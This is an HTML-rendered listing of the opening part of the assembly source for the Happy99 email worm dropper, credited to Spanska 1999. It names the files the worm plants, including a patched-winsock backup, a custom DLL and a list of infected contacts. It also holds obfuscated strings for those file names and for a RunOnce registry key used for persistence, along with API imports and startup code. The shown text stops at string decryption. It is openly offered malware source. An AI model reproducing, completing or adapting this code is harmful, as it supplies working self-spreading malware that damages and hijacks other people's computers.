<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Happy - Happy99_ska_exe.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;ska.exe = happy99.exe</span><span class="sc0">
</span><span class="sc1">;if you want to understand comments, learn french or use Altavista ;)</span><span class="sc0">
</span><span class="sc1">;at the very end, you can post a message for me in alt.comp.virus</span><span class="sc0">
</span><span class="sc1">;look at the readme.rtf with WordPad for some explanations</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; created files:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  wsock32.ska      clean backup of wsock32.dll</span><span class="sc0">
</span><span class="sc1">;  ska.dll      my dll</span><span class="sc0">
</span><span class="sc1">;  ska.exe      the dropper</span><span class="sc0">
</span><span class="sc1">;  Happy99.exe      the traveller</span><span class="sc0">
</span><span class="sc1">;  liste.ska        list of infected friends</span><span class="sc0">

</span><span class="sc1">;--------------------------- (c) Spanska 1999 ---------------------------------</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                               API WINDOWS UTILISEES                                 ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateFileA</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ReadFile</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">WriteFile</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateFileMappingA</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">MapViewOfFile</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetFileSize</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetModuleHandleA</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetProcAddress</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetVersionExA</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CopyFileA</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">LocalAlloc</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">LocalFree</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">RegSetValueExA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">RegCloseKey</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">RegisterClassA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateWindowExA</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ShowWindow</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">UpdateWindow</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">PeekMessageA</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">SetPixelV</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">TranslateMessage</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">DispatchMessageA</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">DefWindowProcA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetDC</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ReleaseDC</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">PostQuitMessage</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                                       DATAS                                         ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;============================= madll.dll compressée et cryptée =============================</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">madll.inc</span><span class="sc0">

</span><span class="sc1">;================================== quelques noms cryptés ==================================</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"i sI"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">" a t"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"uriv"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"a ,s"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"row "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"a ,m"</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"ort "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"?naj"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"UOM "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"OM-T"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"H TU"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"irby"</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"c( d"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"pS )"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"ksna"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"91 a"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">".99"</span><span class="sc0">

        </span><span class="sc1">;db "Is it a virus, a worm, a trojan? MOUT-MOUT Hybrid (c) Spanska 1999"</span><span class="sc0">

</span><span class="sc5">wsock_name</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"osw\"           ;db "</span><span class="sc0">\</span><span class="sc5">wsock32.dll</span><span class="sc13">",0
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"23kc"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"lld."</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wsock_name_size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_name</span><span class="sc0">

</span><span class="sc5">ma_dll_name</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"akS\"           ;db "</span><span class="sc0">\</span><span class="sc5">Ska.dll</span><span class="sc13">",0
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"lld."</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ma_dll_name_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ma_dll_name</span><span class="sc0">

</span><span class="sc5">dropper_name</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"akS\"           ;db "</span><span class="sc0">\</span><span class="sc5">Ska.exe</span><span class="sc13">",0
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dropper_name_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_name</span><span class="sc0">

</span><span class="sc5">sub_key_name</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"tfoS"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"eraw"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc13">"ciM\"
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"osor"</span><span class="sc0">           </span><span class="sc1">;db "Software\Microsoft\Windows\
            dd not "W\tf"           ;db "CurrentVersion\RunOnce",0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"odni"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"C\sw"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"erru"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"eVtn"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"oisr"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"uR\n"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"cnOn"</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">"e"</span><span class="sc0">

</span><span class="sc1">;====================================== divers ======================================</span><span class="sc0">

</span><span class="sc5">wsock_handle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filehandlestock</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filemappinghandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">startoffilemapping</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sizeofmappedfile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">startofPEheader</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nbofsection</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szoptheader</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">diff</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">cdiff</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">idiff</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">addoffunctions</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">addofnames</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;ne pas séparer ces trois</span><span class="sc0">
</span><span class="sc5">addofordinals</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rvaendofcode</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rvaoriginale_1</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rvaoriginale_2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">startofcodeheader</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">verif</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">krnl32ofs</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">krnl32name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">llname</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flname</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FreeLibrary"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gpaname</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">llofs</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">flofs</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">gpaofs</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">writebuffer</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;writebuffer</span><span class="sc0">
</span><span class="sc5">system_dir</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;writebuffer+28000  ;ne pas séparer!</span><span class="sc0">
</span><span class="sc5">dropper_dir</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;writebuffer+28200</span><span class="sc0">
</span><span class="sc5">system_dir_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NbBytesWritten</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ma_dll_handle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NumberOfBytesRead</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">key_handle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">patch_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startpatch</span><span class="sc0">

</span><span class="sc1">;============================ pour l'effet graphique ===========================</span><span class="sc0">

</span><span class="sc5">wndclass</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">clsStyle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4003h</span><span class="sc0">  </span><span class="sc1">; class style</span><span class="sc0">
        </span><span class="sc5">clsLpfnWndProc</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsCbClsExtra</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">clsCbWndExtra</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">clsHInstance</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">; instance handle</span><span class="sc0">
        </span><span class="sc5">clsHIcon</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; class icon handle</span><span class="sc0">
        </span><span class="sc5">clsHCursor</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; class cursor handle</span><span class="sc0">
        </span><span class="sc5">clsHbrBackground</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">      </span><span class="sc1">; class background brush</span><span class="sc0">
        </span><span class="sc5">clsLpszMenuName</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; menu name</span><span class="sc0">
        </span><span class="sc5">clsLpszClassName</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">; far ptr to class name</span><span class="sc0">

</span><span class="sc5">msg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">msHWND</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msMESSAGE</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msWPARAM</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msLPARAM</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msTIME</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">msPT</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">protege</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">nb_explosions</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">compteur</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">yy</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">xx</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">seed</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FFAABB11h</span><span class="sc0">
</span><span class="sc5">theDC</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nom_fenetre</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Happy New Year 1999 !!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle_wd</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adresse_retour</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pas_d_effet_graphique</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                             SE RESERVER DE LA MEMOIRE                               ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">30</span><span class="sc0">        </span><span class="sc1">;number of bytes to allocate</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">;allocation attributes (40h=LMEM_ZEROINIT)</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalAlloc</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28000</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                     VERIFIER QU'ON EST PAS SOUS W3.1                                ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;-------- quelle version de Windows?</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">148</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetVersionExA</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;win32s=0, win32=1, WinNT=2</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stop</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                   COPIER LE DROPPER DANS C:\WINDOWS\SYSTEM                          ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;----- décrypter les datas</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">signature</span><span class="sc0">
